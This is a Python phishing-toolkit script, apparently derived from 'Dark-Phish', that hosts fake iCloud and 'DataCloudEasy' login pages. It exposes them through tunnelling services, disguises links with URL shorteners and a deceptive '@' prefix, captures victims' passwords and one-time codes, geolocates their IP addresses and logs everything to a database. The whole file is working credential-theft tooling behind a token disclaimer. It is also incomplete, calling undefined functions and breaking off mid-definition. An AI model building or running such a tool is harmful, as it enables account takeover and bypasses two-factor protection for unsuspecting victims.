#!/usr/bin/env python3
"""
"""

import sys
try:
	import os
	import time
	import json
	import requests
	import platform, subprocess
	import shutil
	import sqlite3
	import argparse
except ModuleNotFoundError as error:
	print(error)
	sys.exit()
	

version = "2.3.0"
host = "127.0.0.1"
port = "8080"
cf_tunnel_name = ""
cf_hostname = ""
cf_hostnames = []
cf_binary = "core/cloudflared"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

HOSTNAME_SITE_MAP = {
	"datacloudeasy.dylansdecoded.com": "DataCloudEasy",
	"www.datacloudeasy.dylansdecoded.com": "DataCloudEasy",
	"icloud-test.dylansdecoded.com": "iCloud",
	"www.icloud-test.dylansdecoded.com": "iCloud",
}

try:
	parser = argparse.ArgumentParser(add_help=False)
	parser.add_argument("-H", "--host", type=str)
	parser.add_argument("-p", "--port", type=str)

	if ("-h" in sys.argv or "--help" in sys.argv):
		print("""\033[1m
Name:
    DataCloudEasy Site
    
Usage:
    python3 site.py [-h] [-H HOST] [-p PORT] [-u] [-v] [-r]
		
Version:
    {}
		
Options:
    -h,  --help                     Show this help massage.
    -H HOST, --host HOST            Specify the host address [Default : 127.0.0.1] . 
    -p PORT,  --port PORT           Web server port [Default : 8080] .
    -u,  --update                   Check for updates.
    -v,  --version                  Show version number and exit.
    -r,  --retrieve                 Retrieve saved credentials.
	\033[0;0m""".format(version))
		sys.exit()
	else:
		pass

	args = parser.parse_args()
	if ("-u" in sys.argv or "--update" in sys.argv):
		check_update()
		sys.exit()
	elif ("-v" in sys.argv or "--version" in sys.argv):
		print("\nSite version {}\n".format(version))
		sys.exit()
	elif ("-r" in sys.argv or "--retrieve" in sys.argv):
		database_management()
		sys.exit()
	else:
		pass

	if args.host:
		try:
			host = args.host
		except Exception as error:
			print(error)
	else:
		pass
			
	if args.port:
		try:
			port = args.port
		except Exception as error:
			print(error)
	else:
		pass
		
except Exception as error:
	print(error)
	sys.exit()


def printf(message, level):
	timestamp = time.strftime("%H:%M:%S", time.localtime())
	levels = {

		"INFO": "\033[1;92m[INFO]\033[0;0m",
		"WARNING": "\033[1;93m[WARNING]\033[0;0m",
		"ERROR": "\033[1;91m[ERROR]\033[0;0m"
	}

	print("\033[1;94m[{}]{}\033[0;0m {}".format(timestamp, levels.get(level), message))

def logo():
	print("")
	os.system("clear")
	print("""\033[1;91m
██████╗  █████╗ ██████╗ ██╗  ██╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██╔══██╗██║  ██║██║██╔════╝██║  ██║
██║  ██║███████║██████╔╝█████╔╝█████╗██████╔╝███████║██║███████╗███████║
██║  ██║██╔══██║██╔══██╗██╔═██╗╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║
██████╔╝██║  ██║██║  ██║██║  ██╗     ██║     ██║  ██║██║███████║██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \033[0;0mv{}
                                    \033[1;0m Coded by Sajjad | Cyber-Anonymous |

\033[0;0m""".format(version))

def disclaimer():         
	print(" \033[1;100;97m[::] Disclaimer: Developers are not responsible for any [::]\033[0;0;0m\n \033[1;100;97m[::] misuse or damage caused by Dark-Phish.             [::]\033[0;0;0m")



def check_update():
	try:
		version_url = "https://raw.githubusercontent.com/Cyber-Anonymous/Dark-Phish/main/version.txt"
	
		r = requests.get(version_url)
		status = r.status_code     
		if (status == 200):
			gh_version = float(r.text)  
			if (gh_version > version):
				print("\n\033[1;92mA new update (Version {}) is available for Dark-Phish.\033[0;0m\n".format(gh_version))
			else:
				print("\nAlready up to date.\n")
		else:
			print("\033[1;91mUnable to check updates! Please check your internet connection or try again later.\033[0;0m\n")
	except:
		print("\033[1;91mUnable to check updates! Please check your internet connection or try again later.\033[0;0m\n")


def user_pass(data):
	username = ""
	password = ""
	try:
		lines = data.split('\n')
		
		for line in lines:
			
			data = line.split(": ")
			if len(data) == 2:
				key =  data[0]
				value = data[1]
				if key == "Username":
					username = value 
				elif key == "Password":
					password = value
	except Exception as error:
		print(error)
	return username, password

	

def save_data(site, username, password, otp):
	
	os.chdir("..") 
	os.chdir("..") 
	try:
		
		conn = sqlite3.connect(".credentials.db")
		conn.execute("""
		CREATE TABLE IF NOT EXISTS data (
		id INTEGER PRIMARY KEY,
		site TEXT,
		username TEXT,
		password TEXT,
		otp TEXT
		)
		""")
		conn.execute("INSERT INTO data (site, username, password, otp) VALUES (?, ?, ?, ?)", (site, username, password, otp))
		conn.commit()
		print("\nCredentials saved to database.\n")
	except sqlite3.Error as error:
		print("Database error:", error)
	finally:
		conn.close()

def save_aggregated_log(site, username, password, otp):
	try:
		raw_email = ""
		email_path = os.path.join(os.getcwd(), "email.txt")
		if os.path.exists(email_path):
			with open(email_path, "r") as f:
				raw_email = f.read().strip()
			os.remove(email_path)
		
		if not raw_email and username:
			raw_email = username.replace("Username: ", "").strip()
		
		if not raw_email:
			raw_email = "unknown"
		
		safe_email = raw_email.replace("/", "_").replace("\\", "_").replace("..", "_")
		
		ip_info = {}
		ip_path = os.path.join(os.getcwd(), "ip.txt")
		if os.path.exists(ip_path):
			with open(ip_path, "r") as f:
				ip_raw = f.readline().strip()
			ip_addr = ip_raw.replace("IP: ", "").strip()
			ip_info["ip"] = ip_addr
			try:
				geo = requests.get("http://ip-api.com/json/{}".format(ip_addr), timeout=5).json()
				if geo.get("status") == "success":
					ip_info["country"] = geo.get("country", "")
					ip_info["city"] = geo.get("city", "")
					ip_info["region"] = geo.get("regionName", "")
					ip_info["zip"] = geo.get("zip", "")
					ip_info["lat"] = geo.get("lat", "")
					ip_info["lon"] = geo.get("lon", "")
					ip_info["timezone"] = geo.get("timezone", "")
					ip_info["isp"] = geo.get("isp", "")
			except:
				pass
		
		data_dir = os.path.join(BASE_DIR, "data", safe_email)
		os.makedirs(data_dir, exist_ok=True)
		
		log_path = os.path.join(data_dir, "aggregated.logs")
		timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
		
		with open(log_path, "a") as f:
			f.write("=" * 60 + "\n")
			f.write("Timestamp : {}\n".format(timestamp))
			f.write("Site      : {}\n".format(site))
			f.write("Email     : {}\n".format(raw_email))
			if username:
				f.write("{}\n".format(username))
			if password:
				f.write("{}\n".format(password))
			if otp:
				f.write("OTP       : {}\n".format(otp))
			if ip_info:
				f.write("IP        : {}\n".format(ip_info.get("ip", "")))
				f.write("Country   : {}\n".format(ip_info.get("country", "")))
				f.write("City      : {}\n".format(ip_info.get("city", "")))
				f.write("Region    : {}\n".format(ip_info.get("region", "")))
				f.write("Zip       : {}\n".format(ip_info.get("zip", "")))
				f.write("Location  : {},{}\n".format(ip_info.get("lat", ""), ip_info.get("lon", "")))
				f.write("Timezone  : {}\n".format(ip_info.get("timezone", "")))
				f.write("ISP       : {}\n".format(ip_info.get("isp", "")))
			f.write("=" * 60 + "\n\n")
		
		print("\n\033[1;92mAggregated log saved to data/{}/aggregated.logs\033[0;0m".format(safe_email))
	except Exception as error:
		print("\033[1;91mFailed to save aggregated log: {}\033[0;0m".format(error))


def retrieve_data():
	conn = None
	try:
		if (os.path.exists("core/.credentials.db")):
			conn = sqlite3.connect("core/.credentials.db")
			data = conn.execute("SELECT * FROM data")
			print("")
			for line in data:
				print("ID:",line[0])
				print("Site:", line[1])
				print(line[2])
				print(line[3])
				print(line[4])
				print("")
		else:
			print("\n\033[1;91mError: Database file not found!\033[0;0m\n")
	except sqlite3.Error as error:
		print("Database error:", error)
		sys.exit()
	finally:
		if conn is not None:
			conn.close()
		else:
			pass

def delete_data():
	try:
		if (os.path.exists("core/.credentials.db")):
			os.remove("core/.credentials.db")
			print("\nDatabase file deleted successfully.\n")
		else:
			print("\n\033[1;91mError: Database file not found!\033[0;0m\n")
	except Exception as error:
		print(error)
		sys.exit()
	
def database_management():
	logo()
	disclaimer()
	print("")
	print("")
	print("""
Credentials Management Menu:
	
[\033[1;92m01\033[0;0m] Retrieve Credentials
[\033[1;92m02\033[0;0m] Delete Credentials
[\033[1;92m00\033[0;0m] Exit
""")

	while True:
		try:
			option = input("\nOPTION: ")
			option = int(option)
			break
		except:
			print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
			
	if (option == 1):
		try:
			retrieve_data()
		except Exception as e:
			print(e)
			
	elif (option == 2):
		try:
			delete_data()
		except:
			pass
			
	elif (option == 0):
		sys.exit()
	
	else:
		print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
	




try:
	ostype = subprocess.check_output(["uname","-o"], stderr=subprocess.DEVNULL).strip()    
	ostype = ostype.decode()
except (subprocess.CalledProcessError, FileNotFoundError):
	ostype = platform.system()

system = platform.system()     
arch = platform.architecture()    
machine = platform.machine()   






def localhost_server():
	pass



def cloudflare_tunnel():
	global cf_tunnel_name, cf_hostname, cf_hostnames, cf_binary
	cf_hostnames = []
	
	system_cf = shutil.which("cloudflared")
	if system_cf:
		cf_binary = system_cf
		print("\n\033[1;92mUsing system cloudflared: {}\033[0;0m".format(cf_binary))
	elif os.path.exists("core/cloudflared"):
		cf_binary = "core/cloudflared"
		print("\n\033[1;92mUsing local cloudflared: {}\033[0;0m".format(cf_binary))
	else:
		cf_release = "2024.6.1"
		
		if system == "Darwin" and machine == "arm64":
			url = "https://github.com/cloudflare/cloudflared/releases/download/{}/cloudflared-darwin-amd64.tgz".format(cf_release)
			is_tgz = True
		elif system == "Darwin" and machine == "x86_64":
			url = "https://github.com/cloudflare/cloudflared/releases/download/{}/cloudflared-darwin-amd64.tgz".format(cf_release)
			is_tgz = True
		elif ostype == "Android" and arch[0] == "64bit":
			url = "https://github.com/cloudflare/cloudflared/releases/download/{}/cloudflared-linux-arm64".format(cf_release)
			is_tgz = False
		elif (ostype == "Android" and arch[0]) == "32bit":
			url = "https://github.com/cloudflare/cloudflared/releases/download/{}/cloudflared-linux-arm".format(cf_release)
			is_tgz = False
		elif (machine == "aarch64"):
			url = "https://github.com/cloudflare/cloudflared/releases/download/{}/cloudflared-linux-arm64".format(cf_release)
			is_tgz = False
		elif (machine == "x86_64"):
			url = "https://github.com/cloudflare/cloudflared/releases/download/{}/cloudflared-linux-amd64".format(cf_release)
			is_tgz = False
		else:
			url = "https://github.com/cloudflare/cloudflared/releases/download/{}/cloudflared-linux-386".format(cf_release)
			is_tgz = False
		
		print("\n\033[1;92mDownloading Cloudflared...\033[0;0m")
		try:
			filename = wget.download(url)
			if is_tgz:
				os.system("tar zxvf {} > /dev/null 2>&1".format(filename))
				os.system("rm -rf {}".format(filename))
				os.system("mv cloudflared core")
			else:
				os.rename(filename, "cloudflared")
				os.system("mv cloudflared core")
			os.system("chmod +x core/cloudflared")
		except Exception as error:
			print(error)
			sys.exit()
		cf_binary = "core/cloudflared"
	
	auto_config = None
	for candidate in [
		os.path.join(os.path.expanduser("~"), ".cloudflared", "config.yml"),
		os.path.join(os.path.expanduser("~"), ".cloudflared", "config.yaml"),
		"/etc/cloudflared/config.yml",
		"/etc/cloudflared/config.yaml",
		os.path.join("core", "tunnel-config.yml"),
	]:
		if os.path.exists(candidate):
			auto_config = candidate
			break
	
	if auto_config:
		print("\n\033[1;92mFound existing config: {}\033[0;0m".format(auto_config))
		use_auto = input("Use this config? (Y/n): ").strip().lower()
		if use_auto in ["", "y", "yes"]:
			existing_config = auto_config
		else:
			existing_config = input("Config file path (leave empty to set up new): ").strip()
	else:
		print("\n\033[1;93mDo you have an existing Cloudflare tunnel config file?\033[0;0m")
		existing_config = input("Config file path (leave empty to set up new): ").strip()
	
	if existing_config:
		if not os.path.exists(existing_config):
			print("\033[1;91m[!] Config file not found: {}\033[0;0m".format(existing_config))
			sys.exit()
		
		parsed_tunnel = ""
		parsed_hostname = ""
		parsed_creds = ""
		parsed_hostnames = []
		try:
			with open(existing_config, "r") as f:
				in_ingress = False
				for line in f:
					stripped = line.strip()
					if stripped.startswith("tunnel:"):
						parsed_tunnel = stripped.split(":", 1)[1].strip().strip('"').strip("'")
					elif stripped.startswith("credentials-file:"):
						parsed_creds = stripped.split(":", 1)[1].strip().strip('"').strip("'")
					elif stripped == "ingress:":
						in_ingress = True
					elif in_ingress and stripped.startswith("- hostname:"):
						h = stripped.split(":", 1)[1].strip().strip('"').strip("'")
						parsed_hostnames.append(h)
						if not parsed_hostname:
							parsed_hostname = h
		except Exception as error:
			print("\033[1;91m[!] Failed to parse config: {}\033[0;0m".format(error))
			sys.exit()
		
		if not parsed_tunnel:
			print("\033[1;91m[!] No 'tunnel:' field found in config file.\033[0;0m")
			sys.exit()
		if not parsed_hostname:
			parsed_hostname = input("Hostname not found in config. Enter hostname (e.g. phish.example.com): ").strip()
			if not parsed_hostname:
				print("\033[1;91m[!] Hostname cannot be empty.\033[0;0m")
				sys.exit()
		
		cf_tunnel_name = parsed_tunnel
		cf_hostname = parsed_hostname
		cf_hostnames = parsed_hostnames
		
		config_dest = os.path.join("core", "tunnel-config.yml")
		shutil.copy2(existing_config, config_dest)
		
		print("\n\033[1;92mUsing existing config file.\033[0;0m")
		print("\033[1;92mTunnel:\033[0;0m {}".format(cf_tunnel_name))
		print("\033[1;92mHostname:\033[0;0m {}".format(cf_hostname))
		if parsed_creds:
			print("\033[1;92mCredentials:\033[0;0m {}".format(parsed_creds))
		print("")
		return
	
	home_dir = os.path.expanduser("~")
	cf_dir = os.path.join(home_dir, ".cloudflared")
	cert_path = os.path.join(cf_dir, "cert.pem")
	
	if not os.path.exists(cert_path):
		print("\n\033[1;93m[!] Cloudflare authentication required.\033[0;0m")
		print("\033[1;92mA browser window will open. Log in to your Cloudflare account and authorize the tunnel.\033[0;0m\n")
		ret = os.system("{} tunnel login".format(cf_binary))
		if ret != 0:
			print("\n\033[1;91m[!] Cloudflare login failed. Please try again.\033[0;0m")
			sys.exit()
	
	cf_tunnel_name = input("\nTunnel name (e.g. my-tunnel): ").strip()
	if not cf_tunnel_name:
		print("\033[1;91m[!] Tunnel name cannot be empty.\033[0;0m")
		sys.exit()
	
	cf_hostname = input("Hostname / domain (e.g. phish.example.com): ").strip()
	if not cf_hostname:
		print("\033[1;91m[!] Hostname cannot be empty.\033[0;0m")
		sys.exit()
	
	try:
		result = subprocess.run(
			[cf_binary, "tunnel", "list", "--name", cf_tunnel_name, "--output", "json"],
			capture_output=True, text=True
		)
		tunnel_exists = cf_tunnel_name.lower() in result.stdout.lower() if result.returncode == 0 else False
	except Exception:
		tunnel_exists = False
	
	tunnel_id = ""
	creds_path = ""
	
	if not tunnel_exists:
		print("\n\033[1;92mCreating tunnel '{}'...\033[0;0m".format(cf_tunnel_name))
		result = subprocess.run(
			[cf_binary, "tunnel", "create", cf_tunnel_name],
			capture_output=True, text=True
		)
		if result.returncode != 0:
			print("\033[1;91m[!] Failed to create tunnel:\033[0;0m {}".format(result.stderr.strip()))
			sys.exit()
		print(result.stdout.strip())
		
		for line in result.stdout.splitlines():
			if "Created tunnel" in line:
				parts = line.split("with id")
				if len(parts) > 1:
					tunnel_id = parts[1].strip().rstrip(".")
		
		if not tunnel_id:
			for f in os.listdir(cf_dir):
				if f.endswith(".json") and f != "cert.pem":
					tunnel_id = f.replace(".json", "")
					break
		
		creds_path = os.path.join(cf_dir, "{}.json".format(tunnel_id))
		
		print("\n\033[1;92mRouting DNS: {} -> tunnel...\033[0;0m".format(cf_hostname))
		ret = os.system("{} tunnel route dns {} {}".format(cf_binary, cf_tunnel_name, cf_hostname))
		if ret != 0:
			print("\033[1;93m[!] DNS route may already exist or failed. Continuing...\033[0;0m")
	else:
		print("\n\033[1;92mTunnel '{}' already exists. Reusing.\033[0;0m".format(cf_tunnel_name))
		for f in os.listdir(cf_dir):
			if f.endswith(".json") and f != "cert.pem":
				tunnel_id = f.replace(".json", "")
				creds_path = os.path.join(cf_dir, f)
				break
	
	if not tunnel_id or not os.path.exists(creds_path):
		print("\033[1;91m[!] Could not locate tunnel credentials. Ensure tunnel was created properly.\033[0;0m")
		sys.exit()
	
	config_path = os.path.join("core", "tunnel-config.yml")
	config_content = """tunnel: {tunnel_id}
credentials-file: {creds_path}

ingress:
  - hostname: {hostname}
    service: http://{host}:{port}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
""".format(
		tunnel_id=tunnel_id,
		creds_path=creds_path,
		hostname=cf_hostname,
		host=host,
		port=port
	)
	
	with open(config_path, "w") as f:
		f.write(config_content)
	
	print("\n\033[1;92mTunnel config written to core/tunnel-config.yml\033[0;0m")
	print("\033[1;92mTunnel ID:\033[0;0m {}".format(tunnel_id))
	print("\033[1;92mHostname:\033[0;0m {}".format(cf_hostname))
	print("\033[1;92mCredentials:\033[0;0m {}\n".format(creds_path))



def local_tunnel():
	def is_localtunnel_installed():
		try:
			exist = subprocess.run(["lt", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, text=True)
			if (exist.returncode == 0):
				return True
			else:
				return False
		except FileNotFoundError:
			return False
	if (is_localtunnel_installed() == False):
		try:
			print("\033[1;92mInstalling localtunnel...")
			os.system("npm install -g localtunnel")
		except Exception as error:
			print(error)
	else:
		pass




logo()
disclaimer()
print("")
print("")

print("""
[\033[1;92m01\033[0;0m] iCloud
[\033[1;92m02\033[0;0m] DataCloudEasy
[\033[1;92m00\033[0;0m] Exit
""")


while True:
	try:
		option=int(input("\nOPTION: "))
		break
	except:
		print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")


if (option == 0): 
	sys.exit()
else:
	pass
	



print("""\n
[\033[1;92m01\033[0;0m] Localhost
[\033[1;92m02\033[0;0m] Ngrok
[\033[1;92m03\033[0;0m] Cloudflared (Named Tunnel)
[\033[1;92m04\033[0;0m] LocalXpose
[\033[1;92m05\033[0;0m] Serveo
[\033[1;92m06\033[0;0m] Localtunnel
""")
Tunnels = 6          
while True:
	try:
		tunnel = input("\nOPTION: ")
		tunnel = int(tunnel)
		if (tunnel > Tunnels):
			print("\033[1;91m[!] Invalid option!\033[0;0m\n")
		else:
			break
	except:
		print("\033[1;91m[!] Invalid option!\033[0;0m\n")


def start_php_server():
	os.system("""
	php -S {}:{} > /dev/null 2>&1 &
	sleep 4
	""".format(host, port))
	
def start_ngrok_server():
	os.system("""
	./ngrok http {} > /dev/null 2>&1 &
	sleep 10
			""".format(port))	




def is_gd(main_url):
	api = "https://is.gd/create.php?format=simple&url="
	url = api + main_url
	try:
		r = requests.get(url)
		if (r.status_code == 200):
			short = r.text.strip()
		else:
			short = None
		r.close()
		return short
	except:
		return None
		
def tiny_url(main_url):
	api = "https://tinyurl.com/api-create.php?url="
	url = api + main_url
	try:
		r = requests.get(url)
		if(r.status_code == 200):
			short = r.text.strip()
		elif(r.status_code != 200):
			shortener = pyshorteners.Shortener()
			short = shortener.tinyurl.short(main_url)
		else:
			short = None
		r.close()
		return short
	except:
		pass
		return None


def da_gd(main_url):
	api = "https://da.gd/s"
	data = {"url" : main_url}
	try:
		r = requests.post(api, data = data)
		if (r.status_code == 200):
			short = r.text.strip()
		else:
			short = None
		r.close()
		return short
	except:
		return None





def modify_url(keyword, url):
	shorted1 = is_gd(url)
	shorted2 = tiny_url(url)
	shorted3 = da_gd(url)
	modified_urls = []
		
	
	try:
		if("https" in url):
			url = url.replace("https://","",1)
		else:
			url = url.replace("http://","",1)
		modified_url1 = keyword + url   
		modified_urls.append(modified_url1)
	except:
		pass
		
		
	if shorted1:
		try:
			if("https" in shorted1):
				shorted1= shorted1.replace("https://","",1)
			else:
				shorted1 = shorted1.replace("http://","",1)
			modified_url2 = keyword + shorted1
			modified_urls.append(modified_url2)
		except:
			pass
		
		
	if shorted2:
		try:
			if("https" in shorted2):
				shorted2 = shorted2.replace("https://","",1) 
			else:
				shorted2 = shorted2.replace("http://","",1)
			modified_url3 = keyword + shorted2
			modified_urls.append(modified_url3)
		except:
			pass
		
		
	if shorted3:
		try:
			if("https" in shorted3):
				shorted3 = shorted3.replace("https://","",1)
			else:
				shorted3 = shorted3.replace("http://","",1)
			modified_url4 = keyword + shorted3
			modified_urls.append(modified_url4)
		except:
			pass
			
	return modified_urls
	

keywords = {
"iCloud" : "https://www.icloud.com@",
"DataCloudEasy" : "https://datacloudeasy.dylansdecoded.com@",
}





def server(action):

	if args.host or args.port:
		print("\n\033[1;92mHOST:\033[0;0m {}".format(host))
		print("\033[1;92mPORT:\033[0;0m {}".format(port))


	def php_server():
		print("\n\033[1;92mStarting PHP server...\033[0;0m") 
		start_php_server() 
		os.chdir("../") 
		os.chdir("../") 


	if (tunnel == 1):
		print("\n\033[1;92mStarting PHP server...\033[0;0m")
		
		os.system("""
		php -S {}:{} > tunnel.txt 2>&1 & sleep 5
		""".format(host, port))
		
		os.system("""
		grep -o "http://[-0-9A-Za-z.:]*" "tunnel.txt" -oh > link.txt
		""")

		

	elif (tunnel ==  2):
		php_server()
		
		print("\033[1;92mStarting NGROK server...\033[0;0m")
		start_ngrok_server() 
		os.chdir("sites/{}".format(action))
		os.system("""
	curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9A-Za-z]*\.ngrok-free.app" -oh > link.txt
	""")


	elif (tunnel == 3):
		print("\n\033[1;92mStarting PHP server with hostname router...\033[0;0m")
		os.chdir("../")  # CWD: core/sites/
		
		hostname_map = dict(HOSTNAME_SITE_MAP)
		if cf_hostnames:
			for h in cf_hostnames:
				if h not in hostname_map:
					hostname_map[h] = action
		elif cf_hostname and cf_hostname not in hostname_map:
			hostname_map[cf_hostname] = action
		
		map_config = {"map": hostname_map, "default": action}
		with open("hostname_map.json", "w") as f:
			json.dump(map_config, f, indent=2)
		
		os.system("""
		php -S {}:{} router.php > /dev/null 2>&1 &
		sleep 4
		""".format(host, port))
		os.chdir("../")  # CWD: core/
		
		cf_already_running = False
		try:
			result = subprocess.run(["pgrep", "-f", "cloudflared.*tunnel"], capture_output=True, text=True)
			if result.returncode == 0 and result.stdout.strip():
				cf_already_running = True
		except Exception:
			pass
		
		if cf_already_running:
			print("\033[1;92mCloudflared is already running — skipping tunnel start.\033[0;0m")
		else:
			print("\033[1;92mStarting Cloudflared named tunnel '{}'...\033[0;0m".format(cf_tunnel_name))
			os.system("""{} tunnel --config tunnel-config.yml run {} > tunnel.txt 2>&1 &
sleep 8""".format(cf_binary, cf_tunnel_name))
			if os.path.exists("tunnel.txt"):
				shutil.move("tunnel.txt", "sites/{}".format(action))

		os.chdir("sites/{}".format(action))
		
		site_hostname = cf_hostname
		for h, s in hostname_map.items():
			if s == action:
				site_hostname = h
				break
		
		with open("link.txt", "w") as f:
			f.write("https://{}".format(site_hostname))


	elif (tunnel == 4):
		php_server()
		
		print("\033[1;92mStarting LocalXpose tunnel...\033[0;0m")
		while True:
			os.system("""
		./loclx tunnel http --to {}:{} > tunnel.txt 2>&1 &
		sleep 10
		""".format(host, port))
			try:
				temp_file = open("tunnel.txt", 'r')
				temp_data = temp_file.read()
				temp_file.close()
				if ("unauthenticated access" in temp_data):
					os.system("rm -rf tunnel.txt")
					os.system("./loclx account status")
					os.system("./loclx account login")
				else:
					break
			except Exception as error:
					print(error)
					sys.exit()
				
		shutil.move("tunnel.txt","sites/{}".format(action))
		os.chdir("sites/{}".format(action))
		os.system("""
		grep -o "[-0-9A-Za-z]*\.loclx.io" "tunnel.txt" -oh > link.txt""")
		temp = open("link.txt","r")
		link = temp.read()
		temp.close()
		file = open("link.txt","w")
		file.write("https://"+link)
		file.close()


	elif(tunnel == 5):
		php_server()
		
		print("\033[1;92mStarting Serveo tunnel...\033[0;0m")
		os.system("""ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:{}:{} serveo.net > tunnel.txt 2>&1 & sleep 10""".format(host, port))
		shutil.move("tunnel.txt","sites/{}".format(action))
		os.chdir("sites/{}".format(action))
		os.system("""
		grep -o "https://[-0-9a-z]*\.serveo.net" "tunnel.txt" -oh > link.txt
		""")


	elif(tunnel == 6):
		php_server()
		
		print("\033[1;92mStarting Localtunnel...\033[0;0m")
		os.system("""lt --port {} > tunnel.txt 2>&1 & sleep 10""".format(port))
		shutil.move("tunnel.txt", "sites/{}".format(action))
		os.chdir("sites/{}".format(action))
		os.system("""
			grep -o "https://[-0-9a-z]*\.loca.lt" "tunnel.txt" -oh > link.txt
			""")

	else:
		print("\033[1;91m[!] Invalid option!\033[0;0m\n")
		
	file = open("link.txt","r")
	link=file.read()
	file.close()
	
	if (len(link) > 0):
		try:
			condition = input("\nModify the URL (Y/N): ").lower()
			print("")
		except:
			pass
	else:
		condition = None
	print("\033[1;92mSend link:\033[0;0m",link)
	
	if (condition == "y" or condition == "yes"):
		keyword = keywords[action]
		modified = modify_url(keyword, link)
		for modified_url in modified:
			print("\033[1;92mSend link:\033[0;0m", modified_url)
	else:
		pass
	
	
	os.remove("link.txt")
	try:
		os.remove("tunnel.txt")
	except:
		pass
	
	return None



def stop():
	if (tunnel == 1):
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 2):
		os.system("killall ngrok > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill ngrok > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 3):
		os.system("killall cloudflared > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill cloudflared > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 4):
		os.system("killall loclx > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill loclx > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 5):
		os.system("killall ssh > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill ssh > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 6):
		os.system("killall localtunnel > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill localtunnel > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	
	else:
		sys.exit()
	return None

	
def work():
	try:
		print("")
		while not (os.path.exists("log.txt")):
			print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="",flush=True)
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials.  \033[0;0m",end="",flush=True)
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials.. \033[0;0m",end="",flush=True)
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials...\033[0;0m",end="",flush=True)
			time.sleep(1)
			if (os.path.exists("log.txt") == True):
				print("\r\033[1;92mCredentials found.            \033[0;0m")
			
	except:
		stop()
		sys.exit()


	try:
		log_file=open("log.txt","r")
		log=log_file.read()
		log_file.close()
	except:
		pass
	return log
	
def work_otp():
	otp_code = ""
	username = None
	password = None

	try:
		log = work()
		print("")
		print("\033[1;93m" + "=" * 50 + "\033[0;0m")
		printf("CREDENTIALS CAPTURED", "INFO")
		print("\033[1;93m" + "-" * 50 + "\033[0;0m")
		username, password = extract_data(log)
		print("\033[1;93m" + "=" * 50 + "\033[0;0m")

		print("")
		while not (os.path.exists("otp.txt")):
			print("\r\033[1;92mWaiting for the otp   \033[0;0m",end="",flush=True)
			time.sleep(1)
			print("\r\033[1;92mWaiting for the otp.  \033[0;0m",end="",flush=True)
			time.sleep(1)
			print("\r\033[1;92mWaiting for the otp.. \033[0;0m",end="",flush=True)
			time.sleep(1)
			print("\r\033[1;92mWaiting for the otp...\033[0;0m",end="",flush=True)
			time.sleep(1)

		print("\r\033[1;92mOTP received.                 \033[0;0m")
		try:
			otp_file = open("otp.txt","r")
			otp = otp_file.read()
			otp_file.close()
			otp_code = otp.strip().split(": ")[-1] if ": " in otp else otp.strip()
		except:
			pass

		print("")
		print("\033[1;93m" + "=" * 50 + "\033[0;0m")
		printf("OTP CAPTURED", "INFO")
		print("\033[1;93m" + "-" * 50 + "\033[0;0m")
		print("\033[1;92mOTP:\033[0;0m {}".format(otp_code))
		print("\033[1;93m" + "=" * 50 + "\033[0;0m")

		print("")
		print("\033[1;96m" + "=" * 50 + "\033[0;0m")
		printf("CAPTURE SUMMARY", "INFO")
		print("\033[1;96m" + "-" * 50 + "\033[0;0m")
		if username:
			print("  {}".format(username))
		if password:
			print("  {}".format(password))
		print("  \033[1;92mOTP:\033[0;0m {}".format(otp_code))
		print("\033[1;96m" + "=" * 50 + "\033[0;0m")

	except:
		stop()
		sys.exit()

	return username, password, otp_code


def ip_data():
	try:
		ipfile=open("ip.txt","r")
		line=ipfile.readline()
		ipfile.close()
		os.remove("ip.txt")
		ip=line.replace("IP: ","",1)
		ip=str(ip.strip())
		url="http://ip-api.com/json/{}".format(ip)
		data=requests.get(url).json()
		status=data["status"].lower()
		if (status=="success"):
			colour = "\033[1;32m"
		else:
			colour = "\033[1;31m"
		print("\n{}IP STATUS {}\033[0;0m".format(colour,status.upper()))
	except:
		pass
	try:
		if (status=="success"):
			action=input("\nSee more credentials (Y/N): ").lower()
			print("")
			if(action=="y"):
				print("\033[1;92mIP:\033[0;0m",data["query"])
				print("\033[1;92mCountry:\033[0;0m",data["country"])
				print("\033[1;92mCountry code:\033[0;0m",data["countryCode"])
				print("\033[1;92mCity:\033[0;0m",data["city"])
				print("\033[1;92mRegion:\033[0;0m",data["region"])
				print("\033[1;92mRegion name:\033[0;0m",data["regionName"])
				print("\033[1;92mZip:\033[0;0m",data["zip"])
				
				
				print("\033[1;92mLocation:\033[0;0m {},{}".format(data["lat"], data["lon"]))
				print("\033[1;92mTime zone:\033[0;0m",data["timezone"])
				print("\033[1;92mISP:\033[0;0m", data["isp"])
			elif(action=="n"):
				pass
		elif(status=="fail"):
			pass
		else:
			pass
		print("")
	except:
		pass
	return None


def available_tunnels():
	
